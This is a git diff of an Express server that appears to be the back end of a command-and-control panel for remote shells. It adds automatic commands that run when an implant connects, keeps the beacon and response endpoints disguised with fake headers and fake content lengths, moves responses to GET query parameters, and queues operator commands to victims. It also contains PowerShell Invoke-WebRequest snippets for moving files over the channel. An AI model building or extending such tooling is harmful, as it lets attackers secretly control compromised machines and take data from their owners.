@@ -1,8 +1,6 @@
 // Express init
-const https = require('https');
 var express = require('express');
 var xss = require("xss");
-var session = require('express-session')
 var app = express();
 const ejs = require('ejs');
 var expressWs = require('express-ws')(app);
@@ -12,8 +10,8 @@ app.use(express.urlencoded({
 }));
 const fileUpload = require('express-fileupload');
 app.use(fileUpload());
+const http2 = require('http2')
 
-const multer  = require('multer');
 
 const cookieParser = require("cookie-parser");
 const bodyParser = require('body-parser');
@@ -42,6 +40,8 @@ app.use('/profile', require('./routes/profile')(app));
 funs.clean_connections()
 
 // Start
+
+
 app.listen(config.settings.port, function () {
 	console.log('app listening on port ' + config.settings.port + '!');
 	console.log(`http://localhost:${config.settings.port}\n`)
@@ -58,7 +58,6 @@ var id = 0;
 var http_history = []
 var servers = [];
 app.set("servers", servers);
-
 var messagesByServer = {};
 app.set("messagesByServer", messagesByServer);
 async function open_port(port) {
@@ -277,12 +276,13 @@ async function http_listener() {
 	}));
 	lis.use(bodyParser.json());
 	lis.use(cookieParser());
+
 	
-	
-	lis.get(/\/getcommand.*/,funs.fake_headers, (req, res) => {
+	lis.get(/\/getcommand.*/,funs.fake_headers,async (req, res) => {
 		// check if socket is already connected
 		let os = "linux"
 		let os_path = "/assets/linux.png"
+		// check if the conneciton from windows to put windows icon
 		if(req.headers['user-agent'].toLocaleLowerCase().includes("windows")){
 			os = "windows"
 			os_path = "/assets/windows.png"
@@ -309,9 +309,17 @@ async function http_listener() {
 				os:os_path
 			});
 		}	
-			commands.push({
+		const on_connection_commands = await funs.get_all_on_connection_commands()
+		let command = undefined
+		for(i=0;i<on_connection_commands.length;i++){
+			if(command == undefined) command = "";
+			command  += on_connection_commands[i].command + " ; "
+		}
+		
+
+		commands.push({
 				id:id,
-				command:undefined,
+				command:command,
 				download:false
 			})
 		
@@ -323,6 +331,7 @@ async function http_listener() {
 		for(i=0;i<commands.length; i++){
 			if(funs.find_random_value(req,req.cookies) == commands[i].id){
 				// check if there is file uploaded
+				
 				if(commands[i].upload){
 					res.send(`
 					$session = nEW-oBjECt Microsoft.PowerShell.Commands.WebRequestSession
@@ -340,19 +349,19 @@ async function http_listener() {
 				}
 				 if(commands[i].command != undefined){
 					send = false
+					res.status(200)
 					res.send(commands[i].command)
 					http_history.push({command:commands[i].command,id:commands[i].id})
 					commands[i].command = undefined	
-
+					return
 				}else{
 					if(send){
-
+						res.status(200)
 						res.send(`none ${funs.fake_content_len()}`)
 						send = true
 					}
 
 				}
-
 			}
 		}
 	})
@@ -378,9 +387,10 @@ async function http_listener() {
 		}
 
 	})
-
-	lis.post(/\/response.*/,funs.fake_headers, (req, res) => {
+	
+	lis.get(/\/response.*/,funs.fake_headers, (req, res) => {
 		res.send("Hello")
+		req.body = req.query
 		if(funs.find_random_value_body(req.body) == "") return;
 		for(i=0;i<commands.length;i++){
 			if(funs.find_random_value(req,req.cookies) == commands[i].id){
@@ -455,8 +465,13 @@ app.post('/apis/http_command', [funs.check_login_user,funs.http_sessions_check_a
     $req = Invoke-WebRequest "http://localhost:8080/download/mskd" -WebSession $session -Method POST -Body $postParams`
 			}
 			current_command = commands[i]
+			// this for handle two commands in same time
+			if(current_command.command !== undefined){
+				req.body.command = current_command.command + " ; " + req.body.command 
+			}
 			current_command.command = await funs.run_command(req.body.command) 
 			current_command.download = false
+			
 			//process list check
 			if(req.body.process_list){
 				current_command.process_list = true 
@@ -474,6 +489,7 @@ app.get('/apis/http_command_response',[funs.check_login_user,funs.http_sessions_
 	let download
 	let process_list
 	let counter = 0
+	
 	for(i=0;i<commands.length;i++){
 		if(req.query.id == commands[i].id && commands[i].response != undefined){
 		send  = true
